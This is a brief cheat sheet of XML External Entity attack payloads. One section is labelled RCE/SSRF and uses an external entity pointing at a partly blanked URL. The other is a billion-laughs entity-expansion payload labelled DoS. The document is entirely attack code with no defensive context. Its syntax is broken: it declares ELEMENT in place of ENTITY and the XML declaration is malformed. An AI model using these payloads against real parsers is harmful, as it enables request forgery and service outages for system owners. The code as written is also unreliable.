RCE (Remote code Execute) // SSRF(Server-Side request Forgery) 
	<?xml version"1.0" encoding="utf-8"?>
	<!DOCTYPE xxe [
	<!ELEMENT name ANY>
	<!ELEMENT xxe SYSTEM "http://	.com/?amao=1">]>
	<root>
	<name>&xxe;</name>
	</root>
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
DoS(Denial-of-service)
	<!DOCTYPE data[
	<!ELEMENT a0 "dos">
	<!ELEMENT a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
	<!ELEMENT a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
	<!ELEMENT a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
	<!ELEMENT a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
	]>
	<data>&a4;</data>




